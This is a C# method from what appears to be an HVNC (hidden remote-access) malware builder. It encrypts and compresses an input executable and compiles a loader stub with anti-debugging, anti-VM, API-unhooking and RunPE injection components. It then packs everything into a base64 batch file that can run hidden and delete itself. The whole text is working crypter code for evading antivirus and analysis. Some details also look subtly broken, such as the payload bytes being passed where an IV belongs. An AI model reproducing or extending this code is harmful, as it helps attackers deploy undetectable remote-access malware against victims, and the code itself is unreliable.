		private void Crypt(string file)
		{
			this.listBox2.Items.Clear();
			Random rng = new Random();
			byte[] key = Convert.FromBase64String(this.key1.Text);
			byte[] iv = Convert.FromBase64String(this.iv1.Text);
			byte[] key2 = Convert.FromBase64String(this.key2.Text);
			byte[] iv2 = Convert.FromBase64String(this.iv6.Text);
			EncryptionMode encryptionMode = (this.xorEncryption.Checked ? EncryptionMode.XOR : EncryptionMode.AES);
            if (!File.Exists(file))
            {
                MessageBox.Show("Invalid input path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                this.button1.Enabled = true;
                return;
            }
            if (Path.GetExtension(file) != ".exe")
            {
                MessageBox.Show("Invalid input file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                this.button1.Enabled = true;
                return;
            }
            Console.ForegroundColor = ConsoleColor.Gray;
			byte[] array = File.ReadAllBytes(file);
			bool flag;
            if (flag = Utils.IsAssembly(file))
            {
                this.listBox2.Items.Add("Patching assembly...");
				array = Patcher.Fix(array);
			}
            this.listBox2.Items.Add("Encrypting payload...");
            byte[] bytes = Utils.Encrypt(encryptionMode, Utils.Compress(array), key2, iv2);
            this.listBox2.Items.Add("Creating stub...");
            string text = StubGen.CreateCS(key2, iv2, encryptionMode, this.antiDebug.Checked, this.antiVM.Checked, !flag, rng);
            this.listBox2.Items.Add("Building stub...");
            string tempFileName = Path.GetTempFileName();
            File.WriteAllBytes("payload.exe", bytes);
            File.WriteAllBytes("apiunhooker.dll", Utils.Encrypt(encryptionMode, Utils.Compress(Utils.GetEmbeddedResource("HVNC.Resources.apiunhooker.dll")), key2, iv2));
            if (!flag)
            {
                File.WriteAllBytes("runpe.dll", Utils.Encrypt(encryptionMode, Utils.Compress(Utils.GetEmbeddedResource("HVNC.Resources.runpe.dll")), key2, iv2));
            }
            CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider();
            CompilerParameters compilerParameters = new CompilerParameters(new string[4] { "mscorlib.dll", "System.Core.dll", "System.dll", "System.Management.dll" }, tempFileName)
            {
                GenerateExecutable = true,
                CompilerOptions = "/optimize",
                IncludeDebugInformation = false
            };
            compilerParameters.EmbeddedResources.Add("payload.exe");
            compilerParameters.EmbeddedResources.Add("apiunhooker.dll");
            if (!flag)
            {
                compilerParameters.EmbeddedResources.Add("runpe.dll");
            }
            CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, text);
            if (compilerResults.Errors.Count > 0)
            {
                File.Delete("payload.txt");
                if (!flag)
                {
                    File.Delete("runpe.dll");
                }
                File.Delete(tempFileName);
                List<string> list = new List<string>();
                foreach (CompilerError error in compilerResults.Errors)
                {
                    list.Add(error.ToString());
                }
                MessageBox.Show("Stub build errors:" + Environment.NewLine + string.Join(Environment.NewLine, list), "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                this.button1.Enabled = true;
                return;
            }
            byte[] bytes2 = File.ReadAllBytes(tempFileName);
            File.Delete("payload.exe");
            File.Delete("apiunhooker.dll");
            if (!flag)
            {
                File.Delete("runpe.dll");
            }
            File.Delete(tempFileName);
            this.listBox2.Items.Add("Encrypting stub...");
            byte[] inArray = Utils.Encrypt(encryptionMode, Utils.Compress(bytes2), key, array);
            this.listBox2.Items.Add("Creating batch file...");
            string contents = FileGen.CreateBat(key, array, encryptionMode, this.hidden.Checked, this.selfDelete.Checked, rng) + Convert.ToBase64String(inArray);
            this.listBox2.Items.Add("Writing output...");
            File.WriteAllText(Path.ChangeExtension(file, "bat"), contents, Encoding.ASCII);
            this.button1.Enabled = true;
        }

